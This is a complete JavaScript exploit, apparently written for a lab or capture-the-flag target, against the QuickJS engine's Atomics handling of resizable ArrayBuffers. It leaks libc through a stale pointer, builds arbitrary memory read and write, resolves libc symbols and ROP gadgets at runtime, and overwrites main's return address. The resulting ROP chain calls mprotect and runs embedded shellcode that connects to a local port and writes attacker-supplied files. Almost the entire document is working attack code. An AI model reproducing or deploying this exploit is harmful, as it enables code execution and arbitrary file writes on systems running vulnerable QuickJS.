'use strict';

// QuickJS Atomics + Resizable ArrayBuffer stale-pointer exploitation
// Target primitive: connect to 127.0.0.1:9999, receive <u32 fnlen><fn><u32 len><content>, write file.
//
// Offset-independent: resolves libc base, symbols, and ROP gadgets dynamically at runtime.

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

// glibc malloc chunk header size (prev_size,size)
const MALLOC_HDR = 0x10n;

// struct JSObject::u.array.u.ptr offset (stable; from quickjs.c layout)
const JSOBJECT_UARRAY_PTR_OFF = 0x38n;

function hexToBytes(hex) {
  let out = new Uint8Array(hex.length / 2);
  for (let i = 0, j = 0; i < hex.length; i += 2, j++) {
    out[j] = parseInt(hex.slice(i, i + 2), 16);
  }
  return out;
}

// x86_64 Linux syscall shellcode:
// socket/connect to 127.0.0.1:9999, read protocol, openat+write file, exit.
const SHELLCODE_HEX =
  '31c0bf02000000be0100000031d2b8290000000f054989c44883ec1066c70424020066c7442402270fc74424047f00000131c048894424084489e7488d3424ba10000000b82a0000000f054881ec002000004989e54d8d75104d8dbd100400004489e74c89eeba04000000e8ae000000458b4d004181f9f00300000f87910000004489e74c89f64489cae88f00000043c6040e004489e7498d7508ba04000000e879000000418b5d08b801010000bf9cffffff4c89f6ba4102000041baa40100000f054989c285db742bba0008000039d30f42d34189d04489e74c89fee83c0000004489c24489d74c89fee8480000004429c3ebd1b8030000004489d70f05b8030000004489e70f05b83c00000031ff0f05b83c000000bf010000000f054885d2741431c00f054885c07ee64829c24801c64885d275ecc34885d27417b8010000000f054885c07ec94829c24801c64885d275e9c3';

// -------------------- vulnerability primitives --------------------

function leak_libc_ptr() {
  // Leak a libc pointer from allocator metadata using an in-place shrink remainder.
  // Use a barrier allocation to reduce the chance the remainder becomes the top chunk.
  const BIG = 0x3000;
  const SMALL = 0x20;
  const leakIdx = Number((BigInt(SMALL) + MALLOC_HDR) >> 3n); // (0x20 + 0x10) / 8 = 6

  for (let attempt = 0; attempt < 8; attempt++) {
    let rab = new ArrayBuffer(BIG, { maxByteLength: BIG });
    let barrier = new ArrayBuffer(BIG);
    let ta = new BigInt64Array(rab);
    let evil = { valueOf() { rab.resize(SMALL); return 0n; } };
    let v = Atomics.add(ta, leakIdx, evil);

    // heuristic: shared libs usually map at 0x7f.. (top byte >= 0x70)
    let top = Number((v >> 40n) & 0xffn);
    if (top >= 0x70 && v !== 0n)
      return u64(v);
  }
  return 0n;
}

function make_arb_u64_view(base_addr, backing_bytes) {
  // Creates a BigUint64Array whose internal data pointer is corrupted to base_addr.
  base_addr &= ~7n;
  // BigUint64Array requires byteLength % 8 == 0
  backing_bytes = (backing_bytes | 0) >>> 0;
  backing_bytes &= ~7;
  if (backing_bytes < 8) backing_bytes = 8;

  let backing = new ArrayBuffer(backing_bytes);
  let victim = null;

  const L1 = 0x70;
  const L2 = 0x20;
  const overwriteIdx = Number(((BigInt(L2) + MALLOC_HDR + JSOBJECT_UARRAY_PTR_OFF) >> 3n));

  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);

  // small groom to stabilize reuse
  let spray = [];
  for (let i = 0; i < 80; i++) spray.push(new ArrayBuffer(0x40));

  let evil = {
    valueOf() {
      rab.resize(L2);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  Atomics.store(ta, overwriteIdx, evil);
  if (victim === null)
    throw new Error('arb view failed');

  return { base: base_addr, victim, backing };
}

// -------------------- memory helpers --------------------

function readU64(mem, addr) {
  let idx = Number((addr - mem.base) >> 3n);
  let v = mem.victim[idx];
  if (v === undefined) throw new Error('OOB read @' + addr.toString(16));
  return u64(v);
}
function readU32(mem, addr) {
  let w = readU64(mem, addr & ~7n);
  let sh = Number((addr & 7n) * 8n);
  return Number((w >> BigInt(sh)) & 0xffffffffn);
}
function readU16(mem, addr) {
  let w = readU64(mem, addr & ~7n);
  let sh = Number((addr & 7n) * 8n);
  return Number((w >> BigInt(sh)) & 0xffffn);
}
function readU8(mem, addr) {
  let w = readU64(mem, addr & ~7n);
  let sh = Number((addr & 7n) * 8n);
  return Number((w >> BigInt(sh)) & 0xffn);
}

function cstringEquals(mem, addr, s) {
  for (let i = 0; i < s.length; i++) {
    if (readU8(mem, addr + BigInt(i)) !== s.charCodeAt(i))
      return false;
  }
  return readU8(mem, addr + BigInt(s.length)) === 0;
}

// -------------------- find libc base (bounded scan) --------------------

function find_libc_base(leak_ptr) {
  const scan = 0x300000n;
  const start = (leak_ptr & ~0xfffn) - scan;
  let mem = make_arb_u64_view(start, Number(scan + 0x2000n));

  for (let off = scan; off >= 0n; off -= 0x1000n) {
    let w = mem.victim[Number(off >> 3n)];
    if ((w & 0xffffffffn) !== 0x464c457fn)
      continue;
    let cand = (start + off) & ~0xfffn;

    // validate ELF64 ET_DYN x86-64
    try {
      if (readU8(mem, cand + 4n) !== 2) continue; // ELFCLASS64
      if (readU8(mem, cand + 5n) !== 1) continue; // little
      if (readU16(mem, cand + 0x10n) !== 3) continue; // ET_DYN
      if (readU16(mem, cand + 0x12n) !== 62) continue; // x86_64
      return cand;
    } catch (e) {
      continue;
    }
  }
  return 0n;
}

// -------------------- ELF parsing and symbol resolution --------------------

function parseELF64(base, mem) {
  const E_PHOFF = 0x20n;
  const E_PHENTSIZE = 0x36n;
  const E_PHNUM = 0x38n;

  let phoff = readU64(mem, base + E_PHOFF);
  let phentsize = readU16(mem, base + E_PHENTSIZE);
  let phnum = readU16(mem, base + E_PHNUM);

  const PT_LOAD = 1;
  const PT_DYNAMIC = 2;

  let minVaddr = null;
  let dynVaddr = 0n;
  let dynMemsz = 0n;
  let execSegs = [];

  for (let i = 0; i < phnum; i++) {
    let ph = base + phoff + BigInt(i * phentsize);
    let p_type = readU32(mem, ph + 0x0n);
    let p_flags = readU32(mem, ph + 0x4n);
    let p_vaddr = readU64(mem, ph + 0x10n);
    let p_memsz = readU64(mem, ph + 0x28n);

    if (p_type === PT_LOAD) {
      if (minVaddr === null || p_vaddr < minVaddr)
        minVaddr = p_vaddr;
      if (p_flags & 1)
        execSegs.push({ vaddr: p_vaddr, memsz: p_memsz });
    } else if (p_type === PT_DYNAMIC) {
      dynVaddr = p_vaddr;
      dynMemsz = p_memsz;
    }
  }

  if (minVaddr === null)
    throw new Error('ELF missing PT_LOAD');

  let loadBias = base - minVaddr;
  return { base, loadBias, dynVaddr, dynMemsz, execSegs };
}

function parseDynamic(elf, mem) {
  const DT_NULL = 0n;
  const DT_HASH = 4n;
  const DT_STRTAB = 5n;
  const DT_SYMTAB = 6n;
  const DT_STRSZ = 10n;
  const DT_SYMENT = 11n;

  function resolvePtr(val) {
    // some pointers are already relocated by the dynamic loader
    if ((val >> 40n) === (elf.base >> 40n))
      return val;
    return elf.loadBias + val;
  }

  let dynAddr = elf.loadBias + elf.dynVaddr;
  let strtab = 0n, symtab = 0n, strsz = 0n, syment = 0n;
  let hash = 0n;

  for (let off = 0n; off < elf.dynMemsz; off += 0x10n) {
    let tag = readU64(mem, dynAddr + off);
    let val = readU64(mem, dynAddr + off + 8n);
    if (tag === DT_NULL) break;
    if (tag === DT_STRTAB) strtab = resolvePtr(val);
    else if (tag === DT_SYMTAB) symtab = resolvePtr(val);
    else if (tag === DT_STRSZ) strsz = val;
    else if (tag === DT_SYMENT) syment = val;
    else if (tag === DT_HASH) hash = resolvePtr(val);
  }

  if (!strtab || !symtab || !strsz || !syment || !hash)
    throw new Error('missing dynamic tables');

  return { strtab, symtab, strsz, syment, hash };
}

function nsymsFromSysvHash(hashAddr, mem) {
  // hash table header: nbucket, nchain
  return readU32(mem, hashAddr + 4n);
}

function findSymbols(dyn, elf, mem, targets) {
  let nsyms = nsymsFromSysvHash(dyn.hash, mem);

  let out = {};
  for (let t of targets) out[t] = null;
  let remaining = targets.length;

  for (let i = 0; i < nsyms && remaining > 0; i++) {
    let sym = dyn.symtab + BigInt(i) * BigInt(dyn.syment);
    let st_name = readU32(mem, sym + 0n);
    if (st_name === 0) continue;

    let nameAddr = dyn.strtab + BigInt(st_name);
    let c0 = readU8(mem, nameAddr);

    for (let t of targets) {
      if (out[t] !== null) continue;
      if (c0 !== t.charCodeAt(0)) continue;
      if (!cstringEquals(mem, nameAddr, t)) continue;

      let st_value = readU64(mem, sym + 8n);
      let st_size = readU64(mem, sym + 16n);
      out[t] = { addr: elf.loadBias + st_value, size: st_size };
      remaining--;
      break;
    }
  }

  for (let t of targets) {
    if (out[t] === null) throw new Error('missing symbol ' + t);
  }
  return out;
}

// -------------------- find main return address value --------------------

function findMainRetValueFromInitFirst(libcMem, initFirstAddr) {
  // In glibc, __libc_init_first calls main via an indirect call and then
  // does `mov edi, eax; call exit`. The return address for main is the address
  // of `mov edi, eax`.
  //
  // Pattern search: 89 c7 e8 (mov edi,eax ; call rel32)
  for (let off = 0; off < 0x200; off++) {
    let a = initFirstAddr + BigInt(off);
    if (readU8(libcMem, a) === 0x89 &&
        readU8(libcMem, a + 1n) === 0xc7 &&
        readU8(libcMem, a + 2n) === 0xe8) {
      return a;
    }
  }
  return 0n;
}

// -------------------- gadget scanning --------------------

function findGadgetsInExec(elf) {
  function scanSegment(segBase, segSize, need) {
    segSize = segSize & ~7n;
    if (segSize < 8n) segSize = 8n;

    let segMem = make_arb_u64_view(segBase, Number(segSize));
    let words = Math.floor(Number(segSize) / 8);

    let found = Object.assign({}, need);
    let prev1 = -1;
    let prev2 = -1;

    for (let wi = 0; wi < words; wi++) {
      let w = segMem.victim[wi];
      let b = new Array(8);
      let x = w;
      for (let j = 0; j < 8; j++) { b[j] = Number(x & 0xffn); x >>= 8n; }

      for (let j = 0; j < 8; j++) {
        let addr = segBase + BigInt(wi * 8 + j);
        if (!found.ret && b[j] === 0xc3) found.ret = addr;
      }
      for (let j = 0; j < 7; j++) {
        let addr = segBase + BigInt(wi * 8 + j);
        if (!found.pop_rdi && b[j] === 0x5f && b[j + 1] === 0xc3) found.pop_rdi = addr;
        if (!found.pop_rsi && b[j] === 0x5e && b[j + 1] === 0xc3) found.pop_rsi = addr;
        if (!found.pop_rdx && b[j] === 0x5a && b[j + 1] === 0xc3) found.pop_rdx = { addr, pops: 1 };
      }
      for (let j = 0; j < 6; j++) {
        let addr = segBase + BigInt(wi * 8 + j);
        if (!found.pop_rdx && b[j] === 0x5a && b[j + 1] === 0x5b && b[j + 2] === 0xc3)
          found.pop_rdx = { addr, pops: 2 };
      }

      if (prev1 !== -1) {
        let addr = segBase + BigInt(wi * 8 - 1);
        if (!found.pop_rdi && prev1 === 0x5f && b[0] === 0xc3) found.pop_rdi = addr;
        if (!found.pop_rsi && prev1 === 0x5e && b[0] === 0xc3) found.pop_rsi = addr;
        if (!found.pop_rdx && prev1 === 0x5a && b[0] === 0xc3) found.pop_rdx = { addr, pops: 1 };
      }
      if (prev2 !== -1) {
        let b0 = (prev2 >> 8) & 0xff;
        let b1 = prev2 & 0xff;
        let addr = segBase + BigInt(wi * 8 - 2);
        if (!found.pop_rdx && b0 === 0x5a && b1 === 0x5b && b[0] === 0xc3)
          found.pop_rdx = { addr, pops: 2 };
      }

      prev1 = b[7];
      prev2 = (b[6] << 8) | b[7];

      if (found.ret && found.pop_rdi && found.pop_rsi && found.pop_rdx)
        return found;
    }

    return found;
  }

  let best = { ret: null, pop_rdi: null, pop_rsi: null, pop_rdx: null };

  for (let seg of elf.execSegs) {
    let segBase = elf.loadBias + seg.vaddr;
    let segSize = seg.memsz;
    if (segSize > 0x400000n) segSize = 0x400000n;

    best = scanSegment(segBase, segSize, best);
    if (best.ret && best.pop_rdi && best.pop_rsi && best.pop_rdx) break;
  }

  if (!best.ret || !best.pop_rdi || !best.pop_rsi || !best.pop_rdx)
    throw new Error('failed to find ROP gadgets');

  return best;
}

// -------------------- stack scanning helpers --------------------

function findStackSlotByValue(stackMem, value) {
  let n = stackMem.victim.length;
  for (let i = n - 1; i >= 0; i--) {
    if (stackMem.victim[i] === value)
      return i;
  }
  return -1;
}

function writeBytesAsU64(mem, addr, bytes) {
  let off = 0;
  while (off < bytes.length) {
    let val = 0n;
    for (let j = 0; j < 8 && (off + j) < bytes.length; j++) {
      val |= BigInt(bytes[off + j]) << BigInt(j * 8);
    }
    let idx = Number((addr + BigInt(off) - mem.base) >> 3n);
    mem.victim[idx] = u64(val);
    off += 8;
  }
}

// -------------------- exploit --------------------

function pwn() {
  // 1) leak libc pointer
  let leak = leak_libc_ptr();
  if (!leak) return;

  // 2) find libc base
  let libcBase = find_libc_base(leak);
  if (!libcBase) return;

  // Map first 4MB of libc (covers headers, dynsym/strtab, early text)
  let libcMem = make_arb_u64_view(libcBase, 0x400000);

  // 3) parse libc ELF and resolve symbols
  let elf = parseELF64(libcBase, libcMem);
  let dyn = parseDynamic(elf, libcMem);
  let syms = findSymbols(dyn, elf, libcMem, ['mprotect', 'environ', '__libc_init_first']);

  let mprotectAddr = syms.mprotect.addr;
  let environAddr = syms.environ.addr;
  let initFirstAddr = syms.__libc_init_first.addr;

  // 4) compute the exact return address value of main (in __libc_init_first)
  let mainRetVal = findMainRetValueFromInitFirst(libcMem, initFirstAddr);
  if (!mainRetVal) return;

  // 5) find ROP gadgets
  let gad = findGadgetsInExec(elf);
  let retG = gad.ret;
  let popRdi = gad.pop_rdi;
  let popRsi = gad.pop_rsi;
  let popRdx = gad.pop_rdx;

  // 6) locate stack via environ and find the saved return address slot
  let envp = readU64(libcMem, environAddr);

  const STACK_SCAN = 0x200000;
  let stackBase = (envp - BigInt(STACK_SCAN)) & ~7n;
  let stackMem = make_arb_u64_view(stackBase, STACK_SCAN);

  let ret_i = findStackSlotByValue(stackMem, mainRetVal);
  if (ret_i < 0) return;

  // 7) write shellcode on the stack
  let scBytes = hexToBytes(SHELLCODE_HEX);
  let scAddr = (stackBase + 0x20000n) & ~7n;
  let scPage = scAddr & ~0xfffn;

  writeBytesAsU64(stackMem, scAddr, scBytes);

  // 8) build ROP chain: mprotect(scPage, 0x2000, 7) then jump to scAddr
  let chain = [];
  chain.push(retG);
  chain.push(popRdi); chain.push(scPage);
  chain.push(popRsi); chain.push(0x2000n);
  chain.push(popRdx.addr); chain.push(7n);
  if (popRdx.pops > 1) chain.push(0n);
  chain.push(mprotectAddr);
  chain.push(scAddr);

  for (let j = 0; j < chain.length; j++) {
    stackMem.victim[ret_i + j] = u64(chain[j]);
  }
}

pwn();
